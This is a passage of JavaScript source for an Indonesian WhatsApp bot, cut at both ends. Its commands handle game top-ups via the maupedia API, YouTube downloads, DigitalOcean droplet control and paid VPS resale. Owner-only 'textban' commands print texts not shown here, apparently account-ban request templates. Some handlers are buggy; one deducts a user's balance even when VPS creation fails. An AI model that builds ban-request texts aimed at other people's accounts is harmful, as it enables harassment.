▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(hem)

break
//=======================================================//
case 'textbanv8':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lelah = ` ${textbanv8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lelah)

break
//=======================================================//
case 'textbanv9':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const pem = ` ${textbanv9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(pem)

break
//=======================================================//
case 'textbanv10':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ahh = ` ${textbanv10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahh)

break
case "topupgame" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let [id, zone, kode] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-feature',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'order',service: kode,data_no: id,data_zone: zone}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 TOPUP BERHASIL 」 ──*\n\n*_Trx id : ${res.data.data.trxid}_*\n*_Id/zone: ${res.data.data.data}(${res.data.data.zone})_*\n*_Layanan : ${res.data.data.service}_*\n*_Status : ${res.data.data.status}_*\n*_Harga : ${res.data.data.price}_*\n*_Saldo : ${res.data.data.balance}_*\n\n*_Note:Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
    }
break
case "maudeposit" : {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
        let [method, quantity, sender] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/deposit',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'request',method: method,quantity: quantity,sender: sender}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 DEPOSIT 」 ──*\n\n*_》 Trx id : ${res.data.data.trxid}_*\n*_》 METODE: ${res.data.data.method}(${res.data.data.name})_*\n*_Harga : ${res.data.data.sender}_*\n*_》 Jumlah : ${res.data.data.amount}_*\n*_》 Kode Uniq : ${res.data.data.uniq}_*\n*_》 Fee : ${res.data.data.fee}_*\n*_》 Mendapatkan Jumblah : ${res.data.data.get_amount}_*\n*_》 Jumlah Pembayaran : ${res.data.data.pay_amount}_*\n\n*_Note:Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "list-sosmed": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'category');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/social-media', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.category))].join('\n');
    let message = `Gunakan .game nama gamenya untuk melihat list layanan.\nBerikut list game yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Sosmed-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.category}_\n_✨ Id: ${service.id}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "cekgame" : {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let [game, id, zone] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-validation',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,game: game,id: id,zone: zone}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 NICKNAME ${game} 」 ──*\n\n*_》 Id: ${res.data.data.id}_*\n*_》 zone : ${res.data.data.zone}_*\n*_》 Name : ${res.data.data.name}_*\n\n*_Note:Untuk melakukan cek id game silahkan ketik ${prefix}list-game id/zone_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case "list-pascabayar": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'brand');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/postpaid', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.brand))].join('\n');
    let message = `Gunakan .list nama gamenya untuk melihat list layanan.\nBerikut list emoney yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Prabayar-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.brand}_\n_,✨ kode Produk: ${service.code}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "list-prabayar": {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  let fetch = require('node-fetch');
  let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
  let requestData = new URLSearchParams();
  requestData.append('key', api_key);
  requestData.append('sign', sign);
  requestData.append('secret', secret);
  requestData.append('type', 'services');
  requestData.append('filter_type', 'brand');
  requestData.append('filter_value', text);
  let response = await fetch('https://maupedia.com/api/prepaid', {
    method: 'POST',
    body: requestData
  });
  let data = await response.json();
  if (!args[0]) {
    let gameList = [...new Set(data.data.map(item => item.brand))].join('\n');
    let message = `Gunakan .list nama gamenya untuk melihat list layanan.\nBerikut list emoney yang tersedia:\n\n${gameList}`;
    return reply(message);
  } else {
    let serviceList = data.data;
    if (serviceList.length > 0) {
      let message = '*_----- Price List Prabayar-----_*\n';
      for (let service of serviceList) {
        let price = service.price;
        let status = service.status;
       let priceList = `_Rp${price.basic}_`;
        message += `\n_✨ Layanan: ${service.brand}_\n_,✨ kode Produk: ${service.code}_\n_✨ Produk: ${service.name}_\n✨ Harga:${priceList}\n*_✨ Status: ${status}_*\n`;
      }
      return reply(message);
    } else {
      return reply('Tidak ada layanan yang tersedia untuk game tersebut.');
    }
  }
        }
break
case "topup" : case "paket" :{
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
        let [nomer, kode] = q.split(" ")
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/game-feature',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign,type: 'order',service: kode,data_no: nomer}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 TOPUP BERHASIL 」 ──*\n\n*_》 Trx id : ${res.data.data.trxid}_*\n*_》 Nomer: ${res.data.data.data}_*\n*_》 Kode : ${res.data.data.code}_*\n*_》 Topup : ${res.data.data.service}_*\n*_》 status : ${res.data.data.status}_*\n*_》 Informasi : ${res.data.data.note}_*\n*_》 Jumblah : ${res.data.data.balance}_*\n*_》 Price : ${res.data.data.price}_*\n\n*_Untuk melakukan cek status topup silahkan ketik ${prefix}cekstatus No trx id_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
        }
break
case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
 case 'ytsearch':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
				.then(({ data }) => {
					var text = ''
					for (var x of data.result) {
						text += `Title : ${x.title}\n`
						text += `Views : ${x.views}\n`
						text += `Published : ${x.published}\n`
						text += `Thumbnail : ${x.thumbnail}\n`
						text += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
					}
					reply(text)
				})
				.catch(console.error)
			break
case 'ytmp3':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					Biiofc.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
						Biiofc.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break       
  case 'ytmp4':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					Biiofc.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
					})
				.catch(console.error)
			break      
case "sisadroplet":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isOwner) {
      return m.reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    m.reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    m.reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Sok Asik Anjg`)
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 Biiofc.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        m.reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      m.reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
 case "listdroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      Biiofc.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return m.reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      Biiofc.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      Biiofc.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
